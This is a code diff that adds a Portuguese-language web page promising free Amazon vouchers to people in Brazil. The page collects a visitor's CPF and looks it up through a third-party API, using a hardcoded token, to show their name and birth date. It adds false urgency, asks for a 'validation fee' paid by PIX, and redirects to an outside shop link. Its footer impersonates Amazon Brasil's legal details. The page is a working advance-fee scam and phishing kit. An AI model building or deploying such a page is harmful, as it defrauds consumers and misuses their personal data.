@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Site profissional com ofertas exclusivas e serviços de qualidade">
+    <meta name="keywords" content="ofertas, promoções, vale-compras, amazon">
+    <meta name="author" content="Sua Empresa">
+    <title>Meu Site Profissional | Ofertas Exclusivas</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Open+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <!-- Logo -->
+            <div class="logo-container">
+                <a href="#">
+                    <img src="images/logo.png" alt="Logo do Site">
+                </a>
+            </div>
+            
+            <!-- Menu de navegação desktop -->
+            <nav class="main-nav">
+                <a href="#">Home</a>
+                <a href="#">Sobre</a>
+                <a href="#">Serviços</a>
+                <a href="#">Contato</a>
+            </nav>
+            
+            <!-- Botão Ajuda desktop -->
+            <button class="help-btn desktop" id="helpBtn">
+                <span>Ajuda</span>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
+                    <line x1="12" y1="17" x2="12" y2="17"></line>
+                </svg>
+            </button>
+            
+            <!-- Botão Menu Mobile -->
+            <button class="mobile-menu-btn" id="mobileMenuBtn">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <line x1="3" y1="12" x2="21" y2="12"></line>
+                    <line x1="3" y1="6" x2="21" y2="6"></line>
+                    <line x1="3" y1="18" x2="21" y2="18"></line>
+                </svg>
+            </button>
+        </div>
+    </header>
+    
+    <!-- Menu Mobile -->
+    <div class="mobile-menu" id="mobileMenu">
+        <nav class="mobile-menu-nav">
+            <a href="#">Home</a>
+            <a href="#">Sobre</a>
+            <a href="#">Serviços</a>
+            <a href="#">Contato</a>
+        </nav>
+        
+        <button class="help-btn mobile-menu-help-btn" id="mobileHelpBtn">
+            <span>Ajuda</span>
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="12" cy="12" r="10"></circle>
+                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
+                <line x1="12" y1="17" x2="12" y2="17"></line>
+            </svg>
+        </button>
+    </div>
+    
+    <!-- Overlay para menu mobile -->
+    <div class="overlay" id="overlay"></div>
+    
+    <main>
+        <!-- Seção de Validação de CPF -->
+        <section class="cpf-section">
+            <div class="container">
+                <h1>Valide seu CPF para continuar</h1>
+                <p>Preencha seu CPF abaixo para verificar sua elegibilidade para nossas ofertas exclusivas</p>
+                
+                <form id="cpfForm" class="cpf-form">
+                    <div class="form-group">
+                        <label for="cpf">CPF</label>
+                        <input type="text" id="cpf" class="form-control" placeholder="000.000.000-00" required>
+                        <div id="cpfError" class="error-message">Por favor, insira um CPF válido</div>
+                    </div>
+                    
+                    <button type="submit" id="submitBtn" class="btn">Verificar Elegibilidade</button>
+                    
+                    <div id="loading" class="loading">
+                        <div class="spinner"></div>
+                        <p>Verificando seus dados...</p>
+                    </div>
+                </form>
+            </div>
+        </section>
+        
+        <!-- Container de Resultado (movido para fora da cpf-section) -->
+        <div id="result" class="result-container">
+            <h3 class="result-title">Parabéns! Você atende aos critérios para receber a oferta</h3>
+            <p class="result-warning">Apenas uma oferta por CPF</p>
+            
+            <div class="result-item">
+                <span class="result-label">Nome:</span> <span id="resultNome"></span>
+            </div>
+            <div class="result-item">
+                <span class="result-label">CPF:</span> <span id="resultCpf"></span>
+            </div>
+            <div class="result-item">
+                <span class="result-label">Data de Nascimento:</span> <span id="resultNascimento"></span>
+            </div>
+            <div class="result-item">
+                <span class="result-label">Situação Cadastral:</span> <span id="resultSituacao"></span>
+            </div>
+            
+            <button id="offerBtn" class="btn btn-success" style="margin-top: 20px;">PEGAR OFERTA</button>
+            
+            <div class="countdown" id="countdown">30:00</div>
+            
+            <button id="backBtn" class="btn" style="margin-top: 10px;">Voltar</button>
+        </div>
+        
+        <!-- Nova seção de confirmação de oferta (também movida para fora) -->
+        <div id="offerConfirmation" class="offer-confirmation">
+            <h2>🎁 Quase lá! Finalize seu resgate</h2>
+            
+            <p>Parabéns! Você está entre os participantes elegíveis para receber o brinde.</p>
+            
+            <p>Para garantir sua oferta com total segurança, é necessário confirmar sua participação com uma taxa simbólica de validação.</p>
+            
+            <div class="highlight">
+                <p><strong>🔒 Essa taxa cobre os custos operacionais da liberação dos vales e garante a entrega segura do benefício, evitando cadastros duplicados ou tentativas de fraude.</strong></p>
+            </div>
+            
+            <h3>Escolha seu método de pagamento:</h3>
+            
+            <div class="payment-options">
+                <div class="payment-option" data-method="pix">
+                    <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" alt="PIX">
+                    <p>PIX</p>
+                </div>
+            </div>
+            
+            <button id="confirmBtn" class="confirm-btn">CONFIRMAR PARTICIPAÇÃO</button>
+            
+            <div class="security-badge">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="#2ecc71" stroke="#2ecc71" stroke-width="2">
+                    <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3zm-1.06 13.54L7.4 12l1.41-1.41 2.12 2.12 4.24-4.24 1.41 1.41-5.64 5.66z"></path>
+                </svg>
+                Ambiente 100% seguro - Seus dados estão protegidos
+            </div>
+            
+            <p><strong>📝 Após a confirmação:</strong></p>
+            <ul style="text-align: left; margin-left: 20px;">
+                <li>Você receberá um link exclusivo por e-mail e WhatsApp</li>
+                <li>O link leva ao seu vale, que poderá ser usado somente dentro do site da Amazon</li>
+                <li>O crédito é pessoal, intransferível e válido por tempo limitado</li>
+            </ul>
+            
+            <p style="margin-top: 20px;"><strong>📩 Não recebeu o link em até 30 minutos?</strong> Verifique sua caixa de spam ou entre em contato conosco.</p>
+        </div>
+            
+        <!-- Seção de Conteúdo - Agora visível corretamente -->
+        <section class="section">
+            <div class="container">
+                <h2>Sobre Nossa Promoção</h2>
+                <p>Estamos oferecendo vales-compras gratuitos para serem usados na plataforma Amazon como um brinde promocional exclusivo.</p>
+                <p>Os 50 primeiros participantes que atenderem aos critérios poderão resgatar esse benefício.</p>
+            </div>
+        </section>
+    </main>
+    
+    <!-- Modal de Ajuda -->
+    <div id="helpModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn">&times;</span>
+            <h2>Como funciona essa oferta?</h2>
+            <p>Estamos oferecendo vales-compras gratuitos para serem usados na plataforma Amazon como um brinde promocional exclusivo.</p>
+            
+            <p>Os 50 primeiros participantes que atenderem aos critérios poderão resgatar esse benefício.<br>
+            </p>
+            
+            <h3>Quem pode participar?</h3>
+            <p>Para ser elegível, você precisa:</p>
+            <ul>
+                <li>Ter 18 anos ou mais</li>
+                <li>Residir no Brasil</li>
+                <li>Preencher corretamente o formulário com CPF válido (apenas para validação e segurança)</li>
+            </ul>
+            
+            <h3>Por que estamos fazendo isso?</h3>
+            <p>Essa é uma ação promocional de lançamento e visibilidade da nossa campanha. A intenção é gerar reconhecimento e engajamento com nosso público.</p>
+            
+            <h3>Importante:</h3>
+            <ul>
+                <li>A oferta é limitada a 50 pessoas</li>
+                <li>Após o preenchimento do formulário, seus dados serão verificados</li>
+                <li>Participações duplicadas ou inválidas serão desconsideradas</li>
+            </ul>
+            
+            <p>Se tiver dúvidas adicionais, entre em contato conosco pelo e-mail: <a href="mailto:seuemail@dominio.com">seuemail@dominio.com</a> ou pela nossa página no Facebook.</p>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="container">
+            <div class="footer-logo">
+                <a href="#">
+                    <img src="images/logo.png" alt="Logo do Site">
+                </a>
+            </div>
+            
+            <div class="footer-info">
+                <p>© 2025 Amazon. Todos os direitos reservados.</p>
+            </div>
+
+            <div class="footer-info">
+                <p>Amazon Serviços de Varejo do Brasil Ltda. | CNPJ 15.436.940/0001-03</p>
+                <p>Av. Juscelino Kubitschek, 2041, Torre E, 18° andar - São Paulo CEP: 04543-011</p>
+                <p>Fale conosco | ajuda-amazon@amazon.com.br</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Script para o modal de ajuda e menu mobile
+        document.addEventListener('DOMContentLoaded', function() {
+            // Elementos do modal
+            const modal = document.getElementById("helpModal");
+            const helpBtns = document.querySelectorAll("#helpBtn, #mobileHelpBtn");
+            const span = document.getElementsByClassName("close-btn")[0];
+            
+            // Elementos do menu mobile
+            const mobileMenuBtn = document.getElementById("mobileMenuBtn");
+            const mobileMenu = document.getElementById("mobileMenu");
+            const overlay = document.getElementById("overlay");
+            
+            // Abrir modal
+            helpBtns.forEach(btn => {
+                btn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    modal.style.display = "block";
+                    document.body.style.overflow = 'hidden';
+                    closeMobileMenu(); // Fechar menu mobile se estiver aberto
+                });
+            });
+            
+            // Fechar modal com botão
+            span.addEventListener('click', function() {
+                modal.style.display = "none";
+                document.body.style.overflow = 'auto';
+            });
+            
+            // Fechar modal clicando fora
+            window.addEventListener('click', function(event) {
+                if (event.target == modal) {
+                    modal.style.display = "none";
+                    document.body.style.overflow = 'auto';
+                }
+            });
+            
+            // Fechar modal com ESC
+            document.addEventListener('keydown', function(event) {
+                if (event.key === "Escape" && modal.style.display === "block") {
+                    modal.style.display = "none";
+                    document.body.style.overflow = 'auto';
+                }
+            });
+            
+            // Abrir/fechar menu mobile
+            mobileMenuBtn.addEventListener('click', function() {
+                mobileMenu.classList.toggle('active');
+                overlay.classList.toggle('active');
+                document.body.style.overflow = mobileMenu.classList.contains('active') ? 'hidden' : 'auto';
+            });
+            
+            // Fechar menu mobile ao clicar no overlay
+            overlay.addEventListener('click', function() {
+                closeMobileMenu();
+            });
+            
+            // Função para fechar menu mobile
+            function closeMobileMenu() {
+                mobileMenu.classList.remove('active');
+                overlay.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            }
+            
+            // Suavizar scroll para links âncora
+            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    
+                    const targetId = this.getAttribute('href');
+                    if (targetId === '#') return;
+                    
+                    const targetElement = document.querySelector(targetId);
+                    if (targetElement) {
+                        closeMobileMenu(); // Fechar menu mobile antes de rolar
+                        targetElement.scrollIntoView({
+                            behavior: 'smooth'
+                        });
+                    }
+                });
+            });
+            
+            // Máscara para CPF
+            const cpfInput = document.getElementById('cpf');
+            cpfInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                
+                if (value.length > 3) {
+                    value = value.replace(/^(\d{3})/, '$1.');
+                }
+                if (value.length > 7) {
+                    value = value.replace(/^(\d{3})\.(\d{3})/, '$1.$2.');
+                }
+                if (value.length > 11) {
+                    value = value.replace(/^(\d{3})\.(\d{3})\.(\d{3})/, '$1.$2.$3-');
+                }
+                
+                e.target.value = value.substring(0, 14);
+            });
+            
+            // Validação de CPF
+            function validarCPF(cpf) {
+                cpf = cpf.replace(/\D/g, '');
+                
+                if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) {
+                    return false;
+                }
+                
+                // Validação do primeiro dígito verificador
+                let soma = 0;
+                for (let i = 0; i < 9; i++) {
+                    soma += parseInt(cpf.charAt(i)) * (10 - i);
+                }
+                let resto = (soma * 10) % 11;
+                if (resto === 10 || resto === 11) resto = 0;
+                if (resto !== parseInt(cpf.charAt(9))) {
+                    return false;
+                }
+                
+                // Validação do segundo dígito verificador
+                soma = 0;
+                for (let i = 0; i < 10; i++) {
+                    soma += parseInt(cpf.charAt(i)) * (11 - i);
+                }
+                resto = (soma * 10) % 11;
+                if (resto === 10 || resto === 11) resto = 0;
+                if (resto !== parseInt(cpf.charAt(10))) {
+                    return false;
+                }
+                
+                return true;
+            }
+            
+            // Formatar CPF para exibição
+            function formatarCPF(cpf) {
+                return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+            }
+            
+            // Formulário de CPF
+            const cpfForm = document.getElementById('cpfForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            const result = document.getElementById('result');
+            const backBtn = document.getElementById('backBtn');
+            const offerBtn = document.getElementById('offerBtn');
+            const countdownElement = document.getElementById('countdown');
+            
+            cpfForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+                const cpfError = document.getElementById('cpfError');
+                
+                if (!validarCPF(cpf)) {
+                    cpfInput.classList.add('error');
+                    cpfError.style.display = 'block';
+                    return;
+                }
+                
+                cpfInput.classList.remove('error');
+                cpfError.style.display = 'none';
+                
+                // Mostrar loading
+                submitBtn.disabled = true;
+                loading.style.display = 'block';
+                
+                try {
+                    // Faz a consulta à API de CPF
+                    const token = "178657835CNhaALFuDq322561304"; // Token da API
+                    const url = `https://ws.hubdodesenvolvedor.com.br/v2/cpf/?cpf=${cpf}&token=${token}`;
+                    
+                    const response = await fetch(url);
+                    const data = await response.json();
+                    
+                    if (data.return !== "OK") {
+                        throw new Error(data.message || 'Erro na consulta do CPF');
+                    }
+                    
+                    // Preencher resultados
+                    document.getElementById('resultNome').textContent = data.result.nome_da_pf || 'Não encontrado';
+                    document.getElementById('resultCpf').textContent = formatarCPF(cpf);
+                    document.getElementById('resultNascimento').textContent = data.result.data_nascimento || 'Não encontrado';
+                    document.getElementById('resultSituacao').textContent = data.result.situacao_cadastral || 'Não encontrado';
+                    
+                    // Esconder formulário e mostrar resultados
+                    cpfForm.style.display = 'none';
+                    result.style.display = 'block';
+                    
+                    // Iniciar contagem regressiva
+                    startCountdown();
+                    
+                } catch (error) {
+                    console.error("Erro:", error);
+                    document.getElementById('resultNome').textContent = "Erro na consulta";
+                    alert('Ocorreu um erro ao verificar seu CPF. Por favor, tente novamente.');
+                } finally {
+                    // Esconder loading
+                    submitBtn.disabled = false;
+                    loading.style.display = 'none';
+                }
+            });
+            
+            // Botão Voltar
+            backBtn.addEventListener('click', function() {
+                result.style.display = 'none';
+                cpfForm.style.display = 'block';
+                document.getElementById('cpf').value = '';
+                clearInterval(countdownInterval);
+            });
+            
+            // Botão Pegar Oferta
+            offerBtn.addEventListener('click', function() {                            
+            });
+            
+            // Contagem regressiva
+            let countdownInterval;
+            function startCountdown() {
+                let minutes = 30;
+                let seconds = 0;
+                
+                countdownInterval = setInterval(function() {
+                    if (seconds === 0) {
+                        if (minutes === 0) {
+                            clearInterval(countdownInterval);
+                            countdownElement.textContent = "Tempo esgotado!";
+                            offerBtn.disabled = true;
+                            return;
+                        }
+                        minutes--;
+                        seconds = 59;
+                    } else {
+                        seconds--;
+                    }
+                    
+                    const formattedMinutes = minutes.toString().padStart(2, '0');
+                    const formattedSeconds = seconds.toString().padStart(2, '0');
+                    countdownElement.textContent = `${formattedMinutes}:${formattedSeconds}`;
+                }, 1000);
+            }
+            
+            // Elementos da nova tela
+            const offerConfirmation = document.getElementById('offerConfirmation');
+            const paymentOptions = document.querySelectorAll('.payment-option');
+            const confirmBtn = document.getElementById('confirmBtn');
+            
+            // Variável para armazenar o método de pagamento selecionado
+            let selectedPaymentMethod = null;
+            
+            // Quando clicar em "PEGAR OFERTA"
+            offerBtn.addEventListener('click', function() {
+                result.style.display = 'none';
+                offerConfirmation.style.display = 'block';
+                
+                // Rolar para o topo da nova seção
+                window.scrollTo({
+                    top: 0,
+                    behavior: 'smooth'
+                });
+            });
+            
+            // Selecionar método de pagamento
+            paymentOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    // Remover seleção anterior
+                    paymentOptions.forEach(opt => opt.classList.remove('selected'));
+                    
+                    // Adicionar seleção atual
+                    this.classList.add('selected');
+                    selectedPaymentMethod = this.getAttribute('data-method');
+                });
+            });
+            
+            // Confirmar participação
+             confirmBtn.addEventListener('click', function() {
+                if (!selectedPaymentMethod) {
+                    alert('Por favor, selecione um método de pagamento.');
+                    return;
+                }
+                
+                // Redirect to the specified link
+                window.location.href = "https://go.disruptybr.shop/3unutjdqew";
+                             
+              
+                
+                // Simulação: após 3 segundos, mostrar mensagem de sucesso
+                setTimeout(() => {
+                    offerConfirmation.innerHTML = `
+                        <div style="padding: 30px;">
+                            <svg width="80" height="80" viewBox="0 0 24 24" fill="#2ecc71" style="margin-bottom: 20px;">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path>
+                            </svg>
+                            <h2 style="color: #2ecc71;">Resgate confirmado com sucesso!</h2>
+                            <p>Seu vale-compra está sendo processado e você receberá o link exclusivo em instantes.</p>
+                            <p><strong>Verifique seu e-mail e WhatsApp</strong> para acessar seu benefício.</p>
+                            <div class="security-badge" style="margin-top: 30px;">
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="#2ecc71" stroke="#2ecc71" stroke-width="2">
+                                    <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3zm-1.06 13.54L7.4 12l1.41-1.41 2.12 2.12 4.24-4.24 1.41 1.41-5.64 5.66z"></path>
+                                </svg>
+                                Obrigado por participar da nossa promoção!
+                            </div>
+                        </div>
+                    `;
+                }, 1000);
+            });
+        });
+    </script>
+</body>
+</html>
